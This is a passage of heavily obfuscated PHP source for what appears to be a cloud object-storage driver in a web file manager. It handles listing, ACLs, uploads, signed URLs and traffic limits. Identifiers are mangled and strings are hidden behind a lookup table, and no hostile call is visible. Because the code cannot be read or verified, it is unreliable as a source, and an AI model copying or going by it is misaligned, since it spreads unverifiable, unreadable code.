$â áÎ½£ = array($ÍÅ“Šîß[88] => strtotime($²ÑüÓìÖ[$ÍÅ“Šîß[1642]]), $ÍÅ“Šîß[79] => $²ÑüÓìÖ[$ÍÅ“Šîß[1641]] + 0, $ÍÅ“Šîß[1640] => $²ÑüÓìÖ[$ÍÅ“Šîß[1640]]); } if (isset($â áÎ½£[$ÍÅ“Šîß[1640]]) && $â áÎ½£[$ÍÅ“Šîß[1640]]) { $ÇÄ‰°œ[$ÍÅ“Šîß[235]] = trim($â áÎ½£[$ÍÅ“Šîß[1640]], $ÍÅ“Šîß[118]); } if (isset($â áÎ½£[$ÍÅ“Šîß[79]])) { $ÇÄ‰°œ[$ÍÅ“Šîß[79]] = $â áÎ½£[$ÍÅ“Šîß[79]]; } if (isset($â áÎ½£[$ÍÅ“Šîß[88]])) { $ÇÄ‰°œ[$ÍÅ“Šîß[88]] = $â áÎ½£[$ÍÅ“Šîß[88]]; } if (isset($â áÎ½£[$ÍÅ“Šîß[204]]) && !trim($ÇÄ‰°œ[$ÍÅ“Šîß[88]])) { $ÇÄ‰°œ[$ÍÅ“Šîß[88]] = $â áÎ½£[$ÍÅ“Šîß[204]]; } return $ÇÄ‰°œ; } private function folderInfo($·Öƒ›ëü, $Ü•ÚåØ = false, $úº’Ô = array()) { $˜¨äø– =& $_SERVER[”øäÃÍª]; $¢æ´“²ß = array($˜¨äø–[32] => $this->pathThis($·Öƒ›ëü), $˜¨äø–[87] => $this->getPathOuter($˜¨äø–[8] . $·Öƒ›ëü), $˜¨äø–[33] => $˜¨äø–[78]); if ($Ü•ÚåØ) { return $¢æ´“²ß; } $¢æ´“²ß[$˜¨äø–[231]] = $¢æ´“²ß[$˜¨äø–[88]] = 0; $¢æ´“²ß[$˜¨äø–[232]] = $¢æ´“²ß[$˜¨äø–[233]] = !0; if (empty($úº’Ô)) { $·Öƒ›ëü = rtrim($·Öƒ›ëü, $˜¨äø–[8]) . $˜¨äø–[8]; $ÎØ›Ã°í = $this->objectMeta($·Öƒ›ëü); if (!$ÎØ›Ã°í) { return $¢æ´“²ß; } $úº’Ô = array($˜¨äø–[231] => $ÎØ›Ã°í[$˜¨äø–[603]][$˜¨äø–[1645]], $˜¨äø–[88] => strtotime($ÎØ›Ã°í[$˜¨äø–[1642]])); } if (isset($úº’Ô[$˜¨äø–[88]])) { $¢æ´“²ß[$˜¨äø–[88]] = $úº’Ô[$˜¨äø–[88]]; } if (isset($úº’Ô[$˜¨äø–[231]])) { $¢æ´“²ß[$˜¨äø–[231]] = $úº’Ô[$˜¨äø–[231]]; } return $¢æ´“²ß; } public function listPath($™ôèÄûÏ, $Ã³ƒ‹‰® = false) { $ü²˜…¥Ô =& $_SERVER[”øäÃÍª]; $§‚Å¨®´ = $this->fileList($™ôèÄûÏ, $ü²˜…¥Ô[8], !0); foreach ($§‚Å¨®´[$ü²˜…¥Ô[85]] as $Ô¯è¸°‘ => $ë€¬¥óö) { $§‚Å¨®´[$ü²˜…¥Ô[85]][$Ô¯è¸°‘] = $this->folderInfo($ë€¬¥óö, $Ã³ƒ‹‰®, $ë€¬¥óö); } foreach ($§‚Å¨®´[$ü²˜…¥Ô[86]] as $Ô¯è¸°‘ => $ë€¬¥óö) { $§‚Å¨®´[$ü²˜…¥Ô[86]][$Ô¯è¸°‘] = $this->fileInfo($ë€¬¥óö[$ü²˜…¥Ô[32]], $Ã³ƒ‹‰®, $ë€¬¥óö); } return $§‚Å¨®´; } protected function infoChildren($µ«†òÒ£, &$ŒÚ´) { $‹…•ãÅ¨ =& $_SERVER[”øäÃÍª]; $Õ–¤ı¡‹ = $this->fileList($µ«†òÒ£, $‹…•ãÅ¨[12], !0); $ŒÚ´[$‹…•ãÅ¨[81]] += count($Õ–¤ı¡‹[$‹…•ãÅ¨[85]]); $ŒÚ´[$‹…•ãÅ¨[80]] += count($Õ–¤ı¡‹[$‹…•ãÅ¨[86]]); foreach ($Õ–¤ı¡‹[$‹…•ãÅ¨[86]] as $İ’ëºİğ) { if (!$İ’ëºİğ || !$İ’ëºİğ[$‹…•ãÅ¨[79]]) { continue; } $ŒÚ´[$‹…•ãÅ¨[79]] += $İ’ëºİğ[$‹…•ãÅ¨[79]]; } } public function has($œÕú¹á, $úÂàƒã“ = false, $ŞÁ¢—‰ = true) { $ÕÖó¾ÊÒ =& $_SERVER[”øäÃÍª]; $œÕú¹á = trim($œÕú¹á, $ÕÖó¾ÊÒ[8]); $–® ÔÚù = empty($œÕú¹á) && $œÕú¹á !== $ÕÖó¾ÊÒ[228] ? $ÕÖó¾ÊÒ[12] : $œÕú¹á . $ÕÖó¾ÊÒ[8]; $ú¿ÅÃ°¤ = $ÕÖó¾ÊÒ[12]; $½ê°®· = 500; $¦¿ç¤ƒŒ = $×éÃ•¸« = 0; while (!0) { check_abort(); $ß²ŠÃÍï = array($ÕÖó¾ÊÒ[1636] => $ÕÖó¾ÊÒ[8], $ÕÖó¾ÊÒ[1637] => $–® ÔÚù, $ÕÖó¾ÊÒ[1638] => $½ê°®·, $ÕÖó¾ÊÒ[1639] => $ú¿ÅÃ°¤); try { $¾ªÎ˜ºâ = $this->client->listObjects($this->bucket, $ß²ŠÃÍï); } catch (OSS\Core\OssException $ºäİ¼ìá) { $this->writeLog(__FUNCTION__ . $ÕÖó¾ÊÒ[212] . $ºäİ¼ìá->getMessage()); break; } $ú¿ÅÃ°¤ = $¾ªÎ˜ºâ->getNextMarker(); $¤ˆ÷åÙë = $¾ªÎ˜ºâ->getObjectList(); $ £ÔÒ¹Ÿ = $¾ªÎ˜ºâ->getPrefixList(); if ($úÂàƒã“) { if (count($¤ˆ÷åÙë) > 1 || count($¤ˆ÷åÙë) == 1 && $¤ˆ÷åÙë[0]->getKey() != $–® ÔÚù) { $¦¿ç¤ƒŒ += count($¤ˆ÷åÙë) - 1; } if (!empty($ £ÔÒ¹Ÿ)) { $×éÃ•¸« += count($ £ÔÒ¹Ÿ); } if ($ú¿ÅÃ°¤ === $ÕÖó¾ÊÒ[12]) { break; } continue; } if ($ŞÁ¢—‰) { if (!empty($¤ˆ÷åÙë)) { if (count($¤ˆ÷åÙë) > 1 || $¤ˆ÷åÙë[0]->getKey() != $–® ÔÚù) { return !0; } } } else { if (!empty($ £ÔÒ¹Ÿ)) { return !0; } } if ($ú¿ÅÃ°¤ === $ÕÖó¾ÊÒ[12]) { break; } } if ($úÂàƒã“) { return array($ÕÖó¾ÊÒ[239] => $¦¿ç¤ƒŒ, $ÕÖó¾ÊÒ[240] => $×éÃ•¸«); } return !1; } public function listAll($×Ù†”ß) { $Ó¶ºÁ›“ =& $_SERVER[”øäÃÍª]; $…¡Â„ö÷ = $this->fileList($×Ù†”ß, $Ó¶ºÁ›“[12], !0); $öÉÄšæ› = array_to_keyvalue($…¡Â„ö÷[$Ó¶ºÁ›“[86]], $Ó¶ºÁ›“[32]); foreach ($…¡Â„ö÷[$Ó¶ºÁ›“[85]] as $Š·üüş) { if (is_string($Š·üüş)) { $öÉÄšæ›[$Š·üüş] = array($Ó¶ºÁ›“[79] => 0); } } return $this->listAllFiles($×Ù†”ß, $öÉÄšæ›); } public function canRead($¡·ÇÉÏã) { $·€¼¢øš =& $_SERVER[”øäÃÍª]; $œª¤Íê„ = $this->pathAcl($¡·ÇÉÏã); return $œª¤Íê„ == $·€¼¢øš[1646] || $œª¤Íê„ == $·€¼¢øš[650] ? !0 : !1; } public function canWrite($ÔÛ¥š°²) { $ñ¬È—Ğñ = $this->pathAcl($ÔÛ¥š°²); return $ñ¬È—Ğñ == $_SERVER[”øäÃÍª][650] ? !0 : !1; } public function pathAcl($ªâ€”) { $ÅòËÜ™° =& $_SERVER[”øäÃÍª]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÂÍ¾¼â = $this->client->getObjectAcl($this->bucket, $this->pathEncode($ªâ€”)); } catch (OSS\Core\OssException $«ßò¼ëÂ) { $this->writeLog(__FUNCTION__ . $ÅòËÜ™°[212] . $«ßò¼ëÂ->getMessage()); return !1; } $½â¼˜ç = $ÂÍ¾¼â == $ÅòËÜ™°[37] ? $this->bucketAcl : $ÂÍ¾¼â; if ($½â¼˜ç == $ÅòËÜ™°[1647]) { return $ÅòËÜ™°[1646]; } if ($½â¼˜ç == $ÅòËÜ™°[1648]) { return $ÅòËÜ™°[650]; } return $½â¼˜ç; } private function chmodPath($ü¦¶¢±ç, $Ã×Ÿ¿İ = '') { $´”µâü’ =& $_SERVER[”øäÃÍª]; $Ùª­ªÊ« = empty($Ã×Ÿ¿İ) ? $´”µâü’[1648] : $Ã×Ÿ¿İ; $ŒúŸ¼ôœ = array($´”µâü’[37], $´”µâü’[229], $´”µâü’[1647], $´”µâü’[1648]); if (!in_array($Ùª­ªÊ«, $ŒúŸ¼ôœ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ü¦¶¢±ç), $Ùª­ªÊ«); } catch (OSS\Core\OssException $”©úü›Õ) { $this->writeLog(__FUNCTION__ . $´”µâü’[212] . $”©úü›Õ->getMessage()); return !1; } return !0; } public function getContent($Ó ôú’ó) { return $this->fileSubstr($Ó ôú’ó, -1); } public function setContent($¶©Ã¥¬, $ùş÷”‡‰ = '') { $Äû¡ÆÕÀ =& $_SERVER[”øäÃÍª]; try { $İÂĞæ®Ó = $this->trafficLimit($Äû¡ÆÕÀ[1649]); $î’Ñ¤Û = $this->client->putObject($this->bucket, $this->pathEncode($¶©Ã¥¬), $ùş÷”‡‰, $İÂĞæ®Ó); } catch (OSS\Core\OssException $ÏÄ´Œöë) { $this->writeLog(__FUNCTION__ . $Äû¡ÆÕÀ[212] . $ÏÄ´Œöë->getMessage()); return !1; } $ø”ş¶Ğ = array($Äû¡ÆÕÀ[1643] => trim($î’Ñ¤Û[$Äû¡ÆÕÀ[1640]], $Äû¡ÆÕÀ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¶©Ã¥¬))); $this->updateObjMeta($¶©Ã¥¬, $ø”ş¶Ğ); return isset($î’Ñ¤Û[$Äû¡ÆÕÀ[1650]][$Äû¡ÆÕÀ[294]]) ? !0 : !1; } private function updateObjMeta($Â¾ÛÓ«, $÷ÆãÍï) { $Â¾ÛÓ« = $this->pathEncode($Â¾ÛÓ«); try { $£Ö¹ì°¬ = array(OSS\OssClient::OSS_HEADERS => $÷ÆãÍï); $this->client->copyObject($this->bucket, $Â¾ÛÓ«, $this->bucket, $Â¾ÛÓ«, $£Ö¹ì°¬); } catch (OSS\Core\OssException $õãÏ±ªÇ) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $õãÏ±ªÇ->getMessage()); return !1; } return !0; } public function upload($¢Ë¸øÂ, $ÊÏ©÷¥¡, $ÜÆ®šÒ· = false, $°åùÃ¤© = REPEAT_REPLACE) { $ùª˜Ä =& $_SERVER[”øäÃÍª]; if (!$ÊÏ©÷¥¡ || !@file_exists($ÊÏ©÷¥¡)) { return !1; } $öéÄ€šö = trim($¢Ë¸øÂ, $ùª˜Ä[8]); $¿“ïÄœí = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ùª˜Ä[1643] => @md5_file($ÊÏ©÷¥¡)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($¢Ë¸øÂ))); $¿“ïÄœí = $this->trafficLimit($ùª˜Ä[1649], $¿“ïÄœí); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($öéÄ€šö), $ÊÏ©÷¥¡, $¿“ïÄœí); } catch (OSS\Core\OssException $Ã’ëÃ‡³) { $this->writeLog(__FUNCTION__ . $ùª˜Ä[212] . $Ã’ëÃ‡³->getMessage()); return !1; } return $this->getPathOuter($¢Ë¸øÂ); } public function getHost() { $Ã˜àì¨É =& $_SERVER[”øäÃÍª]; $¢µœË¬Ï = explode($Ã˜àì¨É[208], parent::getHost()); return $¢µœË¬Ï[0] . $Ã˜àì¨É[208] . $this->bucket . $Ã˜àì¨É[10] . $¢µœË¬Ï[1]; } public function uploadFormData($äÉÄ¦‘, $™ˆæ‚™ = 3600) { $æÄ¯ô  =& $_SERVER[”øäÃÍª]; if (!($²—¤ÀÁë = $this->getHost())) { return !1; } $ìÃü¿Şû = $™ˆæ‚™; $…õò°ğö = date($æÄ¯ô [1651], time() + $ìÃü¿Şû); $­Ù‹í• = new DateTime($…õò°ğö); $Üö³Õò€ = $­Ù‹í•->format(DateTime::ISO8601); $³ş¯¹ûĞ = strpos($Üö³Õò€, $æÄ¯ô [371]); $Üö³Õò€ = substr($Üö³Õò€, 0, $³ş¯¹ûĞ) . $æÄ¯ô [1652]; $°ô°ªïİ = 1048576000 * 5; $‘ƒ—Âˆö = $this->pathFather($äÉÄ¦‘); $°ó×­ÃÎ = array($æÄ¯ô [262] => $Üö³Õò€, $æÄ¯ô [265] => array(array($æÄ¯ô [1653], 0, $°ô°ªïİ), array($æÄ¯ô [267], $æÄ¯ô [268], $‘ƒ—Âˆö))); $òçîÅ‘÷ = base64_encode(json_encode($°ó×­ÃÎ)); $¨á†ÓĞÓ = base64_encode(hash_hmac($æÄ¯ô [1479], $òçîÅ‘÷, $this->secret, !0)); $½İò“– = array($æÄ¯ô [1654] => $this->accessKey, $æÄ¯ô [277] => $òçîÅ‘÷, $æÄ¯ô [270] => $æÄ¯ô [261], $æÄ¯ô [1655] => $¨á†ÓĞÓ, $æÄ¯ô [206] => $²—¤ÀÁë); $½İò“– = $this->trafficLimit($æÄ¯ô [1649], $½İò“–, !0); return $½İò“–; } public function uploadMultiData($æ‰Ğ³ˆ—, $ç”ì†Ï© = 3600) { $ƒ÷Íô£ =& $_SERVER[”øäÃÍª]; if (!($ ¤ü©ÒÑ = $this->getHost())) { return !1; } $ë€‹ÄŠ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($æ‰Ğ³ˆ—)); return array($ƒ÷Íô£[281] => $ë€‹ÄŠ, $ƒ÷Íô£[206] => $ ¤ü©ÒÑ . $ƒ÷Íô£[8] . $this->pathEncode($æ‰Ğ³ˆ—), $ƒ÷Íô£[282] => gmdate($ƒ÷Íô£[1656]), $ƒ÷Íô£[95] => $æ‰Ğ³ˆ—); } public function uploadMultiAuth($»†­°ñğ, $ßÒÈáÓ´ = array()) { if (isset($ßÒÈáÓ´[$_SERVER[”øäÃÍª][283]])) { return $this->uploadPartAuth($»†­°ñğ, $ßÒÈáÓ´); } return $this->uploadListAuth($»†­°ñğ, $ßÒÈáÓ´); } private function uploadPartAuth($şöÅ®…Ÿ, $·†ÊÀ—Ã = array()) { $Ç­ ÏÛÔ =& $_SERVER[”øäÃÍª]; $ñøŞè½ = $·†ÊÀ—Ã[$Ç­ ÏÛÔ[95]]; $£Á‡Ú‚ = $this->_getUploadAuth($ñøŞè½, $·†ÊÀ—Ã); $Ş°·Êä = array($Ç­ ÏÛÔ[286] => $£Á‡Ú‚[$Ç­ ÏÛÔ[286]], $Ç­ ÏÛÔ[282] => $£Á‡Ú‚[$Ç­ ÏÛÔ[282]]); if (isset($£Á‡Ú‚[$Ç­ ÏÛÔ[1657]])) { $Ş°·Êä[$Ç­ ÏÛÔ[1657]] = $£Á‡Ú‚[$Ç­ ÏÛÔ[1657]]; } return $Ş°·Êä; } private function uploadListAuth($á±§¢, $õ‰óùË÷ = array()) { $¤›Ğ¤Ç» =& $_SERVER[”øäÃÍª]; $®ïöÑ¨Ô = $õ‰óùË÷[$¤›Ğ¤Ç»[95]]; $ØÕĞ¯å— = $õ‰óùË÷[$¤›Ğ¤Ç»[281]]; $‚ÓáİÄ = $this->client->listParts($this->bucket, $this->pathEncode($®ïöÑ¨Ô), $ØÕĞ¯å—); $×·¦Ÿ»Ò = $‚ÓáİÄ->getListPart(); $’¹¶Çâœ = array(); foreach ($×·¦Ÿ»Ò as $¼´Š‡Æ) { $’¹¶Çâœ[] = array($¤›Ğ¤Ç»[297] => $¼´Š‡Æ->getPartNumber(), $¤›Ğ¤Ç»[298] => trim($¼´Š‡Æ->getETag(), $¤›Ğ¤Ç»[118])); } if (!$’¹¶Çâœ) { return !1; } $¥©€”ÉŠ = $this->_getUploadAuth($®ïöÑ¨Ô, $õ‰óùË÷); return array($¤›Ğ¤Ç»[286] => $¥©€”ÉŠ[$¤›Ğ¤Ç»[286]], $¤›Ğ¤Ç»[282] => $¥©€”ÉŠ[$¤›Ğ¤Ç»[282]], $¤›Ğ¤Ç»[289] => $’¹¶Çâœ); } private function _getUploadAuth($¬ıàò’â, $©áŒ§ˆ) { $ÌÚì§’Ò =& $_SERVER[”øäÃÍª]; $™­™ÈÖ = gmdate($ÌÚì§’Ò[1656]); $ÕÀÁèÌş = isset($©áŒ§ˆ[$ÌÚì§’Ò[283]]) ? $ÌÚì§’Ò[253] : $ÌÚì§’Ò[288]; $¨ªš´¶ = array_intersect_key($©áŒ§ˆ, array_flip(array($ÌÚì§’Ò[283], $ÌÚì§’Ò[281]))); ksort($¨ªš´¶); $™°³Ìß  = $¨ªš´¶ ? $ÌÚì§’Ò[76] . http_build_query($¨ªš´¶, null, $ÌÚì§’Ò[284], PHP_QUERY_RFC3986) : $ÌÚì§’Ò[12]; $èû‚Ì¸¤ = array($ÕÀÁèÌş, $ÌÚì§’Ò[12], $ÌÚì§’Ò[120], $™­™ÈÖ, "\x78\55\157\163\163\x2d\144\141\x74\x65\x3a{$™­™ÈÖ}", $ÌÚì§’Ò[8] . $this->bucket . $ÌÚì§’Ò[8] . $¬ıàò’â . $™°³Ìß ); if (isset($©áŒ§ˆ[$ÌÚì§’Ò[283]])) { $Ê³êú” = $this->trafficLimit($ÌÚì§’Ò[1649], array(), !0); if ($Ê³êú”) { $¬ıàò’â = $ÌÚì§’Ò[1657]; array_splice($èû‚Ì¸¤, 5, 0, $¬ıàò’â . $ÌÚì§’Ò[4] . $Ê³êú”[$¬ıàò’â]); } } $©ô²¤Ğ = implode($ÌÚì§’Ò[285], $èû‚Ì¸¤); $ÔÑıäƒ¿ = base64_encode(hash_hmac($ÌÚì§’Ò[1479], $©ô²¤Ğ, $this->secret, !0)); $ç’üŸƒ³ = $ÌÚì§’Ò[1626] . $this->accessKey . $ÌÚì§’Ò[4] . $ÔÑıäƒ¿; $¹òÅ‹Û¤ = array($ÌÚì§’Ò[286] => $ç’üŸƒ³, $ÌÚì§’Ò[282] => $™­™ÈÖ); if (!empty($Ê³êú”)) { $¹òÅ‹Û¤ = array_merge($¹òÅ‹Û¤, $Ê³êú”); } return $¹òÅ‹Û¤; } public function download($™ò¤İñ, $½ªÖ€”°) { $² Â£Ìö =& $_SERVER[”øäÃÍª]; if ($this->isFolder($™ò¤İñ)) { return !1; } try { $óäúÛ‡é = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $½ªÖ€”°); $óäúÛ‡é = $this->trafficLimit($² Â£Ìö[109], $óäúÛ‡é); $this->client->getObject($this->bucket, $this->pathEncode($™ò¤İñ), $óäúÛ‡é); } catch (OSS\Core\OssException $Ò¼»¾±) { $this->writeLog(__FUNCTION__ . $² Â£Ìö[212] . $Ò¼»¾±->getMessage()); return !1; } return $½ªÖ€”°; } public function fileSubstr($íĞôãúµ, $ı¥Í‹öÌ = 0, $§ê½‹ÁÌ = false) { if ($ı¥Í‹öÌ === -1) { $¹ºÖóµ± = array(); } else { if ($§ê½‹ÁÌ === !1) { $»Èì«Óæ = $this->size($íĞôãúµ); } else { $»Èì«Óæ = $ı¥Í‹öÌ + $§ê½‹ÁÌ - 1; } $¹ºÖóµ± = array(OSS\OssClient::OSS_RANGE => "{$ı¥Í‹öÌ}\55{$»Èì«Óæ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($íĞôãúµ), $¹ºÖóµ±); } catch (OSS\Core\OssException $†÷Ó”¥Ö) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][212] . $†÷Ó”¥Ö->getMessage()); think_exception($†÷Ó”¥Ö->getMessage()); return !1; } } private function trafficLimit($º¥ÌˆŞÍ, $±èıãµ’ = array(), $áûâÇÁÏ = false) { $çÃ¿®Ğ· =& $_SERVER[”øäÃÍª]; if ($º¥ÌˆŞÍ == $çÃ¿®Ğ·[1649] && $this->isUploadServer() || $º¥ÌˆŞÍ == $çÃ¿®Ğ·[109] && $this->isFileOutServer()) { return $±èıãµ’; } $¯°óúº© = floatval($GLOBALS[$çÃ¿®Ğ·[6]][$çÃ¿®Ğ·[92]][$çÃ¿®Ğ·[107]][$º¥ÌˆŞÍ]) * 1024 * 1024 * 8; if (!$¯°óúº©) { return $±èıãµ’; } $¯°óúº© = $¯°óúº© < 819200 ? 819200 : ($¯°óúº© > 838860800 ? 838860800 : $¯°óúº©); if ($áûâÇÁÏ) { $±èıãµ’[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¯°óúº©); } else { if (!isset($±èıãµ’[OSS\OssClient::OSS_HEADERS])) { $±èıãµ’[OSS\OssClient::OSS_HEADERS] = array(); } $±èıãµ’[OSS\OssClient::OSS_HEADERS][OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($¯°óúº©); } return $±èıãµ’; } public function link($æ¤ÆĞş•, $—Â…´ß» = array()) { $ĞËô…Á =& $_SERVER[”øäÃÍª]; if (!$this->exist($æ¤ÆĞş•) || $this->isFolder($æ¤ÆĞş•)) { return !1; } try { $—Â…´ß» = $this->trafficLimit($ĞËô…Á[109], $—Â…´ß», !0); $±Ë—»Ü = $this->client->signUrl($this->bucket, $this->pathEncode($æ¤ÆĞş•), 3600 * 12, $ĞËô…Á[1561], $—Â…´ß»); return $this->getCdnLink($±Ë—»Ü); } catch (OSS\Core\OssException $‘Ú·¬›ë) { $this->writeLog(__FUNCTION__ . $ĞËô…Á[212] . $‘Ú·¬›ë->getMessage()); return !1; } } public function fileOut($‘Ø‰Øâª, $®¤ÉÌÆ = false, $ÕÂåÁé† = false, $’³±¯ÃÚ = '') { $şıëù¡Ì =& $_SERVER[”øäÃÍª]; if ($this->isFileOutServer()) { return $this->fileOutServer($‘Ø‰Øâª, $®¤ÉÌÆ, $ÕÂåÁé†, $’³±¯ÃÚ); } if (!$ÕÂåÁé†) { $ÕÂåÁé† = $this->pathThis($‘Ø‰Øâª); } $ÕÂåÁé† = rawurlencode($ÕÂåÁé†); $í¼¸Îü¼ = get_file_mime(get_path_ext($ÕÂåÁé†)); if ($í¼¸Îü¼ == $şıëù¡Ì[248]) { return parent::fileOut($‘Ø‰Øâª, $®¤ÉÌÆ, $ÕÂåÁé†, $’³±¯ÃÚ); } $®¤ÉÌÆ = $®¤ÉÌÆ ? $şıëù¡Ì[1658] : $şıëù¡Ì[1659]; $ãˆ×©‘± = array(OSS\OssClient::OSS_SUB_RESOURCE => $şıëù¡Ì[1660] . rawurlencode("{$®¤ÉÌÆ}\73\146\x69\154\x65\156\141\155\145\75{$ÕÂåÁé†}")); $÷Öåˆ­ = $this->link($‘Ø‰Øâª, $ãˆ×©‘±); $this->fileOutLink($÷Öåˆ­); } public function fileOutServer($Æâ¿ğ¾ß, $øÈ—¶“œ = false, $îÈìÛë = false, $‡ŞÊä§á = '') { parent::fileOut($Æâ¿ğ¾ß, $øÈ—¶“œ, $îÈìÛë, $‡ŞÊä§á); } public function fileOutImage($òÕ½Çí, $“Ç¾êéŸ = 250) { if ($this->size($òÕ½Çí) > 1024 * 1024 * 20) { return $this->fileOutImageServer($òÕ½Çí, $“Ç¾êéŸ); } $££êÎšò = array(OSS\OssClient::OSS_PROCESS => $_SERVER[”øäÃÍª][1623] . $“Ç¾êéŸ); $ƒúŠ»´— = $this->link($òÕ½Çí, $££êÎšò); $this->fileOutLink($ƒúŠ»´—); } public function fileOutImageServer($™øİƒÒ , $ÌàéŸÉá = 250) { parent::fileOutImage($™øİƒÒ , $ÌàéŸÉá); } public function fileOutLink($ä¢™Ş³) { $¶¿üª•Ø =& $_SERVER[”øäÃÍª]; if (!$this->isCdnHost() && substr($ä¢™Ş³, 0, 7) == $¶¿üª•Ø[216]) { $ä¢™Ş³ = $¶¿üª•Ø[217] . substr($ä¢™Ş³, 7); } header($¶¿üª•Ø[172] . $ä¢™Ş³); die; } public function hashMd5($£«’º‹á, $ôö›½Åµ = '') { $º×‡‡Éå =& $_SERVER[”øäÃÍª]; $«¤®ïØ… = $this->_objectMeta($£«’º‹á); if (!$«¤®ïØ…) { return $º×‡‡Éå[12]; } if (!isset($«¤®ïØ…[$º×‡‡Éå[1643]]) && !empty($ôö›½Åµ)) { $Ÿ¢Ñ±’î = $this->updateObjMeta($£«’º‹á, array($º×‡‡Éå[1643] => $ôö›½Åµ)); $«¤®ïØ…[$º×‡‡Éå[1643]] = $Ÿ¢Ñ±’î ? $ôö›½Åµ : $º×‡‡Éå[12]; } return isset($«¤®ïØ…[$º×‡‡Éå[1643]]) ? strtolower($«¤®ïØ…[$º×‡‡Éå[1643]]) : $º×‡‡Éå[12]; } public function size($ú¤ÌÆÛÈ) { $Š€Ìª² = $this->objectMeta($ú¤ÌÆÛÈ); return $Š€Ìª² ? $Š€Ìª²[$_SERVER[”øäÃÍª][79]] : 0; } public function info($íÆâ“ß) { if ($this->isFolder($íÆâ“ß)) { return $this->folderInfo($íÆâ“ß); } else { if ($this->isFile($íÆâ“ß)) { return $this->fileInfo($íÆâ“ß); } } return !1; } public function exist($”Ö¬†•ß) { return $this->isFile($”Ö¬†•ß) || $this->isFolder($”Ö¬†•ß); } public function isFile($Ñıì®ì›) { return !$this->isFolder($Ñıì®ì›) && $this->objectMeta($Ñıì®ì›); } public function isFolder($Ú­³ßòÕ) { return $this->cacheMethod($_SERVER[”øäÃÍª][177], $Ú­³ßòÕ); } protected function objectMeta($ÈëßÓ¦Æ) { return $this->cacheMethod($_SERVER[”øäÃÍª][179], $ÈëßÓ¦Æ); } protected function _objectMeta($ù…¡‰‹š) { $ËŞˆ·ª =& $_SERVER[”øäÃÍª]; try { $á‚Úˆò = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ù…¡‰‹š)); } catch (OSS\Core\OssException $•¦âêÏò) { $this->writeLog(__FUNCTION__ . $ËŞˆ·ª[212] . $•¦âêÏò->getMessage()); $á‚Úˆò = !1; } if ($á‚Úˆò) { $á‚Úˆò[$ËŞˆ·ª[79]] = intval($á‚Úˆò[$ËŞˆ·ª[1641]]); } return $á‚Úˆò; } protected function _isFolder($ÛÀ¤ñ¦) { $ä×İşûÛ =& $_SERVER[”øäÃÍª]; if ($ÛÀ¤ñ¦ == $ä×İşûÛ[12] || $ÛÀ¤ñ¦ == $ä×İşûÛ[8]) { return !0; } $ĞÃï‹«‚ = array($ä×İşûÛ[1636] => $ä×İşûÛ[8], $ä×İşûÛ[1637] => rtrim($ÛÀ¤ñ¦, $ä×İşûÛ[8]) . $ä×İşûÛ[8], $ä×İşûÛ[1638] => 1, $ä×İşûÛ[1639] => $ä×İşûÛ[12]); $ãÁåñ¢ = $this->client->listObjects($this->bucket, $ĞÃï‹«‚); if ($ãÁåñ¢->getObjectList() || $ãÁåñ¢->getPrefixList()) { return !0; } return !1; } public function writeLog($£ò•º¥¤ = '', $şæ…Õ¥ù = false) { $òøª™ğİ =& $_SERVER[”øäÃÍª]; $ÆğÓóÔ = in_array(ACTION, array($òøª™ğİ[210], $òøª™ğİ[211])); if (!$ÆğÓóÔ && !GLOBAL_DEBUG) { return; } $Õ½×Ğ¤ª = 0; if (stripos($£ò•º¥¤, $òøª™ğİ[1661]) !== !1) { $Õ½×Ğ¤ª = 1; $Ôç¶¬Ä± = explode($òøª™ğİ[1662], $£ò•º¥¤); $£ò•º¥¤ = !empty($Ôç¶¬Ä±[1]) ? $Ôç¶¬Ä±[1] : $£ò•º¥¤; } else { if (stripos($£ò•º¥¤, $òøª™ğİ[1663])) { $Õ½×Ğ¤ª = 2; $Ôç¶¬Ä± = explode($òøª™ğİ[1663], $£ò•º¥¤); $Ôç¶¬Ä± = explode($òøª™ğİ[4], $Ôç¶¬Ä±[0]); $£ò•º¥¤ = !empty($Ôç¶¬Ä±[1]) ? $Ôç¶¬Ä±[1] : $£ò•º¥¤; } } if ($ÆğÓóÔ && I18n::getType() == $òøª™ğİ[1664]) { if ($Õ½×Ğ¤ª == 1) { $£ò•º¥¤ = str_replace($òøª™ğİ[1665], $òøª™ğİ[1666], $£ò•º¥¤); } else { if ($Õ½×Ğ¤ª == 2) { $Ôç¶¬Ä± = explode($òøª™ğİ[212], $Ôç¶¬Ä±[0]); $â£°¯Ïá = isset($Ôç¶¬Ä±[1]) ? $Ôç¶¬Ä±[1] : $òøª™ğİ[12]; $±İ±Şõß = array($òøª™ğİ[1667] => $òøª™ğİ[1668], $òøª™ğİ[1669] => $òøª™ğİ[1670], $òøª™ğİ[1671] => $òøª™ğİ[1672], $òøª™ğİ[1673] => $òøª™ğİ[1674], $òøª™ğİ[1675] => $òøª™ğİ[1676], $òøª™ğİ[1677] => $òøª™ğİ[1678], $òøª™ğİ[1679] => $òøª™ğİ[1680], $òøª™ğİ[1681] => $òøª™ğİ[1682], $òøª™ğİ[1683] => $òøª™ğİ[1684], $òøª™ğİ[1685] => $òøª™ğİ[1686]); if (isset($±İ±Şõß[$â£°¯Ïá])) { $£ò•º¥¤ = $±İ±Şõß[$â£°¯Ïá]; } } } if (stripos($£ò•º¥¤, $òøª™ğİ[1687])) { $£ò•º¥¤ = $òøª™ğİ[1688]; } } if (!trim($£ò•º¥¤)) { return; } parent::writeLog(trim($£ò•º¥¤), $şæ…Õ¥ù); } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public 